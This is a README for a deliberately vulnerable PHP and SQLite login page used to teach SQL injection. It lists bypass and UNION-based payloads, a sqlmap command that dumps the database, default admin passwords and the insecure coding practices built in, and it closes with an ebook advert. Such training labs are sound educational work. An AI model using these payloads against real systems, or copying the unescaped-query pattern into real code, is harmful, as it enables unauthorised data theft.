# TestSiteSQLinjection

> A deliberately vulnerable web application designed for teaching SQL injection techniques. This project provides a simple login page with known SQL injection vulnerabilities for educational purposes.

⚠️ **WARNING:** This application is intentionally vulnerable and is meant for educational use only. DO NOT deploy this in any production environment.

---

## Overview

This project simulates a basic login page with intentional SQL injection vulnerabilities, helping students and professionals learn about:

- Basic SQL injection techniques
- SQLMap usage
- Web application security testing
- Database exploitation

---

## Prerequisites

To run this project, ensure the following are installed:

- PHP 7.0 or higher
- SQLite3
- Python 3.x (for SQLMap)
- SQLMap

---

## Installation

1. Clone the repository:

   ```bash
   git clone https://github.com/ctkqiang/TestSiteSQLinjection.git
   cd TestSiteSQLinjection
   ```

2. Initialize the database:

   ```sql
   -- The following SQL will be automatically executed on the first run
   CREATE TABLE IF NOT EXISTS users (
       id INTEGER PRIMARY KEY,
       username TEXT,
       password TEXT
   );

   -- Sample user data is pre-populated
   -- Including admin and regular user accounts
   ```

---

## Running the Application

1. Start the PHP development server:

   ```bash
   php -S 0.0.0.0:3000
   ```

2. Access the application:

   - Open your browser and navigate to `http://localhost:3000`
   - The login page will be displayed

---

## Testing SQL Injection

### Manual Testing

Try these SQL injection payloads to explore vulnerabilities:

1. **Basic authentication bypass:**

   ```sql
   ' OR '1'='1
   ```

2. **UNION-based injection:**

   ```sql
   ' UNION SELECT username, password, id FROM users--
   ```

3. **Comment-based bypass:**

   ```sql
   admin'--
   ```

### Automated Testing with SQLMap

Run SQLMap to automate SQL injection testing:

```bash
python3 sqlmap.py -u "http://localhost:3000/index.php" --data="username=admin&password=' OR 1=1--" --dbms=sqlite --dump
```

**SQLMap Parameters Explained:**

- `-u`: Target URL
- `--data`: POST data with injection points
- `--dbms`: Specify database type (SQLite)
- `--dump`: Retrieve database contents

---

## Success Indicators

When successfully exploited, the application will:

1. Log "hacked" to the browser console
2. Display retrieved user information
3. Show successful login messages

---

## Database Structure

The application uses SQLite with the following schema:

```sql
users
├── id (INTEGER PRIMARY KEY)
├── username (TEXT)
└── password (TEXT)
```

The database is pre-populated with test accounts, including:

- **Regular Users:** john.doe, jane.smith, etc.
- **Admin Users:** admin/admin123, admin/secretpass123

---

## Security Notice

This application contains intentional vulnerabilities, such as:

- Unescaped SQL queries
- Direct user input in SQL statements
- Plain text password storage
- No input sanitization

**DO NOT:**

- Use this code in production
- Deploy this on a public server
- Use real credentials or sensitive data

---

## Educational Goals

By using this project, you will learn:

1. How SQL injection vulnerabilities occur
2. Methods to identify SQL injection points
3. Using automated tools for security testing
4. Understanding database structure through exploitation
5. The importance of proper input sanitization

---

## Contributing

Contributions are welcome! You can help by:

- Adding new vulnerabilities for testing
- Improving documentation
- Creating additional learning resources
- Adding more test cases

---

### Want to Hack Like a Pro?

🚀 I've distilled 10 years of expertise into one powerful eBook. Learn advanced techniques, practical examples, and step-by-step commands to master SQL injection with SQLMap.

[Purchase Now](https://ko-fi.com/s/5ad8a06662) and start your journey today!

#sqlinjection #hacking #cybersecurity #ethicalhacking #ebook
